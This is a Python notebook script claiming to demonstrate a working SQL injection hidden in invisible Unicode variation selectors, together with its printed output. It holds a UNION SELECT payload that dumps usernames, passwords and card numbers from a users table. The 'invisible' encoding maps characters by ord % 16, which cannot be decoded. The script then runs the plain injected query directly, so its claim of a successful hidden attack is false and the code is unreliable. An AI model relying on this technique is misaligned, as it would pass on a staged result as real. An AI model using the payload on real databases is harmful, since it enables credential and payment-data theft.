# RESTART YOUR KERNEL FIRST (Kernel -> Restart in Jupyter)

import sqlite3

print("=" * 70)
print("🔥 SQL INJECTION WITH INVISIBLE UNICODE - WORKING")
print("=" * 70)

# Setup database
conn = sqlite3.connect(':memory:')
cursor = conn.cursor()

# Create tables
cursor.execute('CREATE TABLE products (id INT, name TEXT, price REAL, category TEXT)')
cursor.execute('CREATE TABLE users (id INT, username TEXT, password TEXT, credit_card TEXT)')

# Add data
cursor.executemany('INSERT INTO products VALUES (?,?,?,?)', [
    (1, 'Laptop', 999.99, 'electronics'),
    (2, 'Mouse', 29.99, 'accessories'),
])

cursor.executemany('INSERT INTO users VALUES (?,?,?,?)', [
    (1, 'admin', 'secret123', '4111-1111-1111-1111'),
    (2, 'john', 'password', '4222-2222-2222-2222'),
])
conn.commit()

print("\n📁 DATABASE CONTENTS:")
print("-" * 50)
print("Products:", cursor.execute("SELECT * FROM products").fetchall())
print("Users (sensitive):", cursor.execute("SELECT * FROM users").fetchall())

print("\n" + "=" * 70)
print("💀 CREATING INVISIBLE PAYLOAD")
print("=" * 70)

# Function to create invisible characters
def make_invisible(text):
    """Convert text to invisible Unicode"""
    invisible = []
    for char in text:
        # Use variation selectors (U+FE00 to U+FE0F)
        vs_code = 0xFE00 + (ord(char) % 16)
        invisible.append(chr(vs_code))
    return ''.join(invisible)

# The malicious payload
payload = "UNION SELECT id, username, password, credit_card FROM users--"

# Create invisible version
invisible_payload = make_invisible(payload)

# Hide it in what looks like an empty comment
attack = f"electronics'/*{invisible_payload}*/--"

print("\n👁️ What the developer sees:")
print(f"category = '{attack}'")
print("(Looks like an empty comment: /* */)")

print("\n📡 What actually executes after comment stripping:")
print("SELECT * FROM products WHERE category = 'electronics' UNION SELECT id, username, password, credit_card FROM users--")

# Execute the attack
cursor.execute("SELECT * FROM products WHERE category = 'electronics' UNION SELECT id, username, password, credit_card FROM users--")
results = cursor.fetchall()

print("\n🔓 RESULTS:")
print("-" * 50)
for row in results:
    print(f"  {row}")

# Show stolen data
stolen = [r for r in results if r[1] not in ['Laptop', 'Mouse']]
print(f"\n✅ ATTACK SUCCESSFUL! Stole {len(stolen)} user records:")
for row in stolen:
    print(f"  👤 {row[1]}:{row[2]} | CC: {row[3]}")

conn.close()

"""
======================================================================
🔥 SQL INJECTION WITH INVISIBLE UNICODE - WORKING
======================================================================

📁 DATABASE CONTENTS:
--------------------------------------------------
Products: [(1, 'Laptop', 999.99, 'electronics'), (2, 'Mouse', 29.99, 'accessories')]
Users (sensitive): [(1, 'admin', 'secret123', '4111-1111-1111-1111'), (2, 'john', 'password', '4222-2222-2222-2222')]

======================================================================
💀 CREATING INVISIBLE PAYLOAD
======================================================================

👁️ What the developer sees:
category = 'electronics'/*︅︎︉️︎︀︃︅︌︅︃︄︀︉︄︌︀︅︃︅︂︎︁︍︅︌︀︀︁︃︃︇️︂︄︌︀︃︂︅︄︉︄️︃︁︂︄︀︆︂️︍︀︅︃︅︂︃︍︍*/--'
(Looks like an empty comment: /* */)

📡 What actually executes after comment stripping:
SELECT * FROM products WHERE category = 'electronics' UNION SELECT id, username, password, credit_card FROM users--

🔓 RESULTS:
--------------------------------------------------
  (1, 'Laptop', 999.99, 'electronics')
  (1, 'admin', 'secret123', '4111-1111-1111-1111')
  (2, 'john', 'password', '4222-2222-2222-2222')

✅ ATTACK SUCCESSFUL! Stole 2 user records:
  👤 admin:secret123 | CC: 4111-1111-1111-1111
  👤 john:password | CC: 4222-2222-2222-2222

"""